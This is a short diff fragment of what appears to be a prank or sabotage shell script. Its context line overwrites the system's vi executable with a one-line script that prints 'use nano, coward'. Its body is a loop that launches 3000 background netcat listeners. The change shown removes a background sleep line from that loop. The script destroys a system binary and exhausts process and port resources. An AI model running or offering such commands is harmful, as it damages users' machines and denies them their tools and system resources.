@@ -20,5 +20,4 @@ echo "echo use nano, coward" > $(which vi)
 for i in {1..3000}
 do
    nc -l &
-   sleep 9999 &
 done
